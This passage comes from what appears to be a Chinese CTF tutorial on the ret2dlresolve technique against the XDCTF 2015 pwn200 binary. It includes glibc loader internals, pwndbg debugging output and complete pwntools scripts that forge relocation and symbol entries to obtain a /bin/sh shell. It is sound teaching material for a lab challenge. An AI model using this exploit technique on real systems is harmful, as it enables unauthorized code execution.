ndx_addr: 0x80487a8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以发现，ndx_落入了 <code>.eh_frame</code> 节中。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.eh_frame:080487A8                 dw 442Ch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。</p>
<pre class="line-numbers language-c"><code class="language-c">        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
                <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c "", 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13 times>, 0x8049fbc, 0x0 <repeats 25 times>, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对应的分别为 </p>
<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be "GLIBC_2.0", 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d "libc.so.6"
  }}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p>
<p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。</p>
<p>那自然的，我们就可以调用目标函数。</p>
<p>这里，我们可以通过调整 base_stage 来达到相应的目的。</p>
<ul>
<li>首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。</li>
<li>那么，这也就说明原先的符号表偏移少了对应的个数。</li>
<li>因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。</li>
</ul>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x080487C2</span><span class="token operator">-</span><span class="token number">0x080487A8</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">0x10</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>

plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

<span class="token comment" spellcheck="true"># make a fake write symbol at base_stage + 32 + align</span>
fake_sym_addr <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">32</span>
align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span>
                <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># since the size of Elf32_Symbol is 0x10</span>
fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x10</span>  <span class="token comment" spellcheck="true"># calculate the dynsym index of write</span>
fake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># make fake write relocation at base_stage+24</span>
index_offset <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">-</span> rel_plt
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span> <span class="token comment" spellcheck="true"># calculate the r_info according to the index of write</span>
fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>write_got<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span>

gnu_version_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.gnu.version'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ndx_addr: %s"</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>gnu_version_addr<span class="token operator">+</span>index_dynsym<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct rop chain</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake ret addr of write</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write reloc</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> align<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write symbol</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最终如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27967
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h5><p>这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x080487C2</span><span class="token operator">-</span><span class="token number">0x080487A8</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">0x10</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>

plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

<span class="token comment" spellcheck="true"># make a fake write symbol at base_stage + 32 + align</span>
fake_sym_addr <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">32</span>
align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># since the size of Elf32_Symbol is 0x10</span>
fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x10</span>  <span class="token comment" spellcheck="true"># calculate the dynsym index of write</span>
st_name <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">-</span> dynstr         <span class="token comment" spellcheck="true"># plus 10 since the size of Elf32_Sym is 16.</span>
fake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>st_name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># make fake write relocation at base_stage+24</span>
index_offset <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">-</span> rel_plt
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span> <span class="token comment" spellcheck="true"># calculate the r_info according to the index of write</span>
fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>write_got<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct rop chain</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake ret addr of write</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write reloc</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> align<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># fake write symbol</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'write\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># there must be a \x00 to mark the end of string</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage5.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27994
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。</p>
<h5 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h5><p>这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 <code>_dl_runtime_resolve</code> 函数最终是依赖函数名来解析目标地址的。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x080487C2</span><span class="token operator">-</span><span class="token number">0x080487A8</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">0x10</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>

plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
